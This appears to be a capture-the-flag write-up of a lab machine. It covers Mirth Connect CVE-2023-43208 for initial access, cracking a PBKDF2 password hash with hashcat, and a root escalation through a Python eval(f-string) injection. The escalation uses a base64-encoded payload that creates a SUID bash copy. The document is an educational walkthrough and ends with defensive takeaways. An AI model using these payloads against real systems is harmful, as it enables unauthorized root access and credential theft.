Phase 1

Initial Access — Mirth Connect Pre-Auth RCE (CVE-2023-43208)

CVE-2023-43208 explained CVE-2023-37679 affected Mirth Connect pre-4.4.0, and the vendor patched it in 4.4.0 — but the fix was incomplete. CVE-2023-43208 is a bypass of that patch, achieving pre-authentication RCE via XStream deserialization. The attacker sends crafted XML to the API, which is deserialized into arbitrary Java objects that execute system commands. Fixed in 4.4.1.

Crack PBKDF2-HMAC-SHA256

Mirth stores passwords as PBKDF2-HMAC-SHA256 with 600,000 iterations. The base64 blob contains the salt (first 8 bytes) and hash (remaining bytes). Convert to hashcat format:

$ python3 -c '
import base64
raw = base64.b64decode("u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==")
salt = base64.b64encode(raw[:8]).decode()
h = base64.b64encode(raw[8:]).decode()
print(f"sha256:600000:{salt}:{h}")
'
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=

$ echo 'sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=' > hash.txt
$ hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt

Phase 3

Privilege Escalation — Python f-string eval() Injection

Internal Service Discovery

sedric@interpreter:~$ ss -tlnp
LISTEN 127.0.0.1:54321

sedric@interpreter:~$ ps aux | grep root
root 3590 ... /usr/bin/python3 /usr/local/bin/notif.py

A Python notification service running as root on port 54321. The script accepts XML patient data and formats it using an f-string template — but then passes the result through eval().

The fatal eval(f-string) pattern The script's template() function concatenates user input into a string, then calls eval(f"f'''{template}'''"). Any {...} in the input becomes a Python expression evaluated with root privileges. The regex whitelist ^[a-zA-Z0-9._'"(){}=+/]+$ allows all characters needed to construct expressions — {} for f-string injection, () for function calls, . for attribute access, "' for strings. It blocks spaces and semicolons, but that's easily bypassed with base64 encoding.

Port Forward

$ ssh -L 54321:localhost:54321 sedric@10.129.244.184

Read Root Flag Directly

open().read() contains no spaces or semicolons — it passes the regex cleanly:

Full Root Shell (Base64 Bypass)

For persistent root access, we need to run commands with spaces. Encode the command in base64 (only alphanumeric + +/=, all in the whitelist), then decode and execute at runtime:

# Step 1: Encode the command
$ echo -n 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' | base64 -w0
Y3AgL2Jpbi9iYXNoIC90bXAvcm9vdGJhc2g7IGNobW9kIDQ3NTUgL3RtcC9yb290YmFzaA==

# Step 2: Send payload — __import__ chains don't contain spaces either
$ python3 -c '
import urllib.request
payload = """{__import__("os").system(__import__("base64").b64decode("Y3AgL2Jpbi9iYXNoIC90bXAvcm9vdGJhc2g7IGNobW9kIDQ3NTUgL3RtcC9yb290YmFzaA==").decode())}"""
data = f"""<patient>
<firstname>a</firstname>
<lastname>a</lastname>
<sender_app>a</sender_app>
<timestamp>a</timestamp>
<birth_date>01/01/2000</birth_date>
<gender>{payload}</gender>
</patient>""".encode()
req = urllib.request.Request("http://127.0.0.1:54321/addPatient", data=data, method="POST")
req.add_header("Content-Type", "application/xml")
print(urllib.request.urlopen(req).read().decode())
'

Appendix

Key Takeaways

Mirth Connect 4.4.0 has a pre-auth RCE.

CVE-2023-43208 bypasses the incomplete fix for CVE-2023-37679. XStream deserialization allows unauthenticated code execution. Upgrade to 4.4.1+.

Config files are always the first thing to read after foothold.

mirth.properties contained plaintext database credentials. From there: database → user hashes → cracked password → SSH.

PBKDF2 with 600k iterations still falls to weak passwords.

snowflake1 is in rockyou. High iteration counts slow down brute-force but can't save a dictionary word.

eval(f-string) with user input = arbitrary code execution.

Even with a regex whitelist, if it allows {} and (), attackers can construct full Python expressions. Base64 encoding bypasses space/semicolon restrictions trivially.

Root services on localhost are still exploitable.

Any user with SSH access can port-forward localhost services. "Internal only" is not a security boundary — it's one ssh -L away from being external.
